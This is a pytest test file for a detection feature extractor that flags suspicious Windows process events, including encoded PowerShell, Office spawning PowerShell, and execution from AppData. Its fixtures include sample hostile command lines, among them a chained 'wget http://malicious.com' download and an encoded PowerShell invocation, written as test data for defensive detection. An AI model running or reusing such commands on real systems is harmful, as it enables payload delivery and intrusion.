import pytest
import pandas as pd
from app.features.process_features import process_process_events

@pytest.fixture
def process_df():
    """Generates a standard dataframe for process evaluation."""
    return pd.DataFrame([
        {
            "timestamp": "2026-06-21T10:00:00Z",
            "entity_key": "host-1",
            "process_name": "powershell.exe",
            "parent_process_name": "cmd.exe",
            "command_line": "powershell -enc SGVsbG8="
        }
    ])

def test_lolbin_detected(process_df):
    """Ensure Living-off-the-Land binaries are flagged."""
    process_df["timestamp"] = pd.to_datetime(process_df["timestamp"])
    features = process_process_events(process_df)
    row = features.iloc[0]
    
    assert row["has_lolbin"] == 1.0

def test_encoded_payload_detected(process_df):
    """Ensure base64/encoded command line arguments are flagged."""
    process_df["timestamp"] = pd.to_datetime(process_df["timestamp"])
    features = process_process_events(process_df)
    row = features.iloc[0]
    
    assert row["has_encoded_payload"] == 1.0

def test_parent_child_anomaly():
    """Ensure suspicious process lineages are flagged."""
    df = pd.DataFrame([
        {
            "timestamp": "2026-06-21T10:00:00Z",
            "entity_key": "host-1",
            "process_name": "powershell.exe",
            "parent_process_name": "winword.exe",
            "command_line": ""
        }
    ])
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    features = process_process_events(df)
    row = features.iloc[0]
    
    assert row["parent_child_anomaly"] == 1.0

def test_suspicious_cmd_score_range():
    """Ensure string matching yields a score between 0 and 1."""
    df = pd.DataFrame([
        {
            "timestamp": "2026-06-21T10:00:00Z",
            "entity_key": "host-1",
            "process_name": "cmd.exe",
            "parent_process_name": "explorer.exe",
            "command_line": "cmd.exe /c ping 8.8.8.8 && wget http://malicious.com"
        }
    ])
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    features = process_process_events(df)
    row = features.iloc[0]
    
    assert 0.0 < row["suspicious_cmd_score"] <= 1.0

def test_from_temp_dir_flag():
    """Ensure execution from temporary user directories is flagged."""
    df = pd.DataFrame([
        {
            "timestamp": "2026-06-21T10:00:00Z",
            "entity_key": "host-1",
            "process_name": "malware.exe",
            "parent_process_name": "explorer.exe",
            "command_line": "C:\\Users\\user\\AppData\\Roaming\\malware.exe"
        }
    ])
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    features = process_process_events(df)
    row = features.iloc[0]
    
    assert row["from_temp_dir"] == 1.0

def test_clean_process_scores_zero():
    """Ensure standard legitimate processes yield zero suspicious flags."""
    df = pd.DataFrame([
        {
            "timestamp": "2026-06-21T10:00:00Z",
            "entity_key": "host-1",
            "process_name": "chrome.exe",
            "parent_process_name": "explorer.exe",
            "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""
        }
    ])
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    features = process_process_events(df)
    row = features.iloc[0]
    
    assert row["has_lolbin"] == 0.0
    assert row["has_encoded_payload"] == 0.0
    assert row["parent_child_anomaly"] == 0.0
    assert row["from_temp_dir"] == 0.0
